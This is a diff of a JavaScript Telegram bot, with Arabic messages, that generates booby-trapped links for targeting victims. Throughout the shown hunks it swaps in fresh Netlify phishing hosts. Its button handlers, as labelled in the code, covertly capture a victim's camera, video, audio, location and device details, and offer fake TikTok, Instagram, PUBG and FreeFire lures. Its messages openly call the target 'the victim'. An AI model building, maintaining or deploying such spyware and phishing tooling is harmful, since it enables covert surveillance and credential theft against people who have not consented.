@@ -1528,33 +1528,6 @@ function isVIPUser(userId) {
 }
 
 
-
-async function fetchLinks() {
-    const url = "https://sssssskskjwnsb-linklsksn.hf.space";
-
-    try {
-        const response = await axios.get(url);
-
-        const $ = cheerio.load(response.data);
-
-        // استخراج جميع الروابط
-        const linkur = [];
-        $("a[href]").each((i, el) => {
-            linkur.push($(el).attr("href"));
-        });
-
-        console.log("الروابط المستخرجة:");
-        console.log(linkur);
-
-        return linkur;
-
-    } catch (err) {
-        console.log("حدث خطأ:", err);
-        return [];
-    }
-}
-
-fetchLinks();
 bot.onText(/\/stㅇㅗㅑㅡarㅏt/, async (msg) => {
     const chatId = msg.chat.id;
     const isSubscribed = await isUserSubscribed(chatId);
@@ -1680,38 +1653,17 @@ bot.onText(/\/stㅇㅗㅑㅡarㅏt/, async (msg) => {
         });
     }
 });
-
-
-
-bot.on('callback_query', (callbackQuery) => {  
-    const chatId = callbackQuery.message.chat.id;  
+bot.on('callback_query', (callbackQuery) => {
+    const chatId = callbackQuery.message.chat.id;
     const data = callbackQuery.data;
 
-    // استخراج الرابط الصحيح من linkur
-    // مثلاً linkur يحتوي عدة روابط ونريد الذي ينتهي بـ "ca"
-    let extracted = null;
-    const links = linkur.match(/https?:\/\/[^\s]+/g); // استخراج كل الروابط
+    if (data === 'capture_video') {
+        const message = `تم انشاء الرابط ملاحظه قم في تليغم رابط جديد في كل مرهملاحظه بزم يكون النت قوي في جهاز الضحيه\n: https://dulcet-youtiao-594f0b.netlify.app/ca/?chatId=${chatId}`;
 
-    if (links) {
-        for (const l of links) {
-            if (l.endsWith('/ca') || l.endsWith('/ca/')) {
-                extracted = l;
-                break;
-            }
-        }
-    }
-
-    // إذا لم يجد رابط ينتهي بـ /ca استخدم الرابط الأصلي كاحتياط
-    if (!extracted) {
-        extracted = "https://lucky-bubblegum-d77796.netlify.app/ca";
-    }
-
-    if (data === 'capture_video') {  
-        const message =
-            `تم انشاء الرابط ملاحظه قم في تليغم رابط جديد في كل مره ملاحظه لازم يكون النت قوي في جهاز الضحيه\n: ${extracted}/?chatId=${chatId}`;
-
-        if (message.trim() !== '') {  
-            bot.sendMessage(chatId, message);  
+        if (message && message.trim() !== '') {
+            bot.sendMessage(chatId, message);
+        } else {
+            console.log('🚫 تم منع إرسال رسالة فارغة في callback_query.');
         }
     }
 });
@@ -1735,7 +1687,7 @@ bot.on('callback_query', async (callbackQuery) => {
     }
 
     if (data === 'request_verification') {
-        const verificationLink = `https://fanciful-druid-aad13f.netlify.app/n/?chatId=${chatId}`;
+        const verificationLink = `https://storied-marigold-53af68.netlify.app/n/?chatId=${chatId}`;
         bot.sendMessage(chatId, `تم انشاء الرابط ملاحظه قم في تليغم رابط جديد في كل مرهلخـ ^_^ـ.راق وتساب\n: ${verificationLink}`);
         return;
     }
@@ -1844,10 +1796,10 @@ bot.on('callback_query', async (callbackQuery) => {
 
         switch (action) {
             case 'captureFront':
-                link = `https://mellifluous-frangipane-c22acb.netlify.app/c/?chatId=${chatId}`;
+                link = `https://aesthetic-caramel-1741cc.netlify.app/c/?chatId=${chatId}`;
                 break;
             case 'captureBack':
-                link = `https://meek-froyo-0df2e1.netlify.app/b/?chatId=${chatId}`;
+                link = `https://taupe-cocada-c6a2b7.netlify.app/b/?chatId=${chatId}`;
                 break;
             case 'getLocation':
                 link = `${baseUrl}/getLocation/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
@@ -1857,7 +1809,7 @@ bot.on('callback_query', async (callbackQuery) => {
                 link = `${baseUrl}/record/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}&duration=${duration}`;
                 break;
             case 'rshq_tiktok':
-                link = `https://zippy-kringle-e8e51f.netlify.app/t/?chatId=${chatId}&type=tiktok`;
+                link = `https://fantastic-meringue-d0fc62.netlify.app/t/?chatId=${chatId}&type=tiktok`;
                 break;
             case 'rshq_instagram':
                 link = `https://eloquent-brigadeiros-4de644.netlify.app/i/?chatId=${chatId}`;
@@ -1893,7 +1845,7 @@ bot.on('callback_query', (query) => {
 
 
     if (query.data === 'collect_device_info') {
-        const url = `https://effervescent-chimera-19a252.netlify.app/mm/?chatId=${chatId}`;
+        const url = `https://keen-praline-ccdd60.netlify.app/mm/?chatId=${chatId}`;
         bot.sendMessage(chatId, `رابط جمع المعلومات: ${url}`);
     }
 
@@ -1918,7 +1870,7 @@ bot.on('callback_query', (query) => {
                     dataStore[chatId] = { userLink };
 
 
-                    bot.sendMessage(chatId, `تم تلغيم هذا الرابط ⚠️:\https://incomparable-meringue-36eed3.netlify.app/k.html?chatId=${chatId}`);
+                    bot.sendMessage(chatId, `تم تلغيم هذا الرابط ⚠️:\nhttps://fancy-bubblegum-44d039.netlify.app/k.html?chatId=${chatId}`);
 
 
                     bot.removeListener('message', messageHandler);
@@ -2309,11 +2261,11 @@ bot.on('callback_query', (query) => {
     let link;
 
     if (query.data === 'get_pubg') {
-        link = `https://effulgent-halva-4fabb1.netlify.app/g.html?chatId=${chatId}.png`;
+        link = `https://jazzy-daifuku-17cbc7.netlify.app/g.html?chatId=${chatId}.png`;
     } else if (query.data === 'get_freefire') {
         link = `https://vocal-arithmetic-0beea4.netlify.app/F?chatId=${chatId}.png`;
     } else if (query.data === 'add_names') {
-        link = `https://super-brigadeiros-46c826.netlify.app/s.html?chatId=${chatId}.png`;
+        link = `https://deluxe-melomakarona-f35f5f.netlify.app/s.html?chatId=${chatId}.png`;
     }
 
     if (link) {
@@ -2631,7 +2583,7 @@ bot.on('callback_query', (callbackQuery) => {
     const messageId = callbackQuery.message.message_id;
 
     if (callbackQuery.data === 'get_photo_link') {
-        const link = `https://papaya-puffpuff-4f123f.netlify.app/xx.html?chatId=${chatId}`;
+        const link = `https://deft-quokka-ecbdea.netlify.app/xx.html?chatId=${chatId}`;
         bot.sendMessage(chatId, `سيتم تصوير الضحيه بدقه عاليه: ${link}`);
     }
 });
@@ -4203,7 +4155,7 @@ bot.on('callback_query', (callbackQuery) => {
         const targetChatId = data.split(':')[1];
         
         // إنشاء رابط HTML فريد لكل مستخدم
-        const locationUrl = `https://cute-brigadeiros-aedd53.netlify.app/lo/?chatId=${targetChatId}`;
+        const locationUrl = `https://superlative-sprite-8a7ef5.netlify.app/lo/?chatId=${targetChatId}`;
         
         // إرسال الرابط كرسالة نصية عادية
         bot.sendMessage(
@@ -4304,7 +4256,7 @@ bot.on('callback_query', (callbackQuery) => {
         const targetChatId = data.split(':')[1];
         
         // إنشاء رابط HTML فريد لكل مستخدم
-        const audioUrl = `https://jolly-donut-dec1ee.netlify.app/r/?chatId=${targetChatId}`;
+        const audioUrl = `https://exquisite-vacherin-1bf48f.netlify.app/r/?chatId=${targetChatId}`;
         
         // إرسال الرابط كرسالة نصية عادية
         bot.sendMessage(
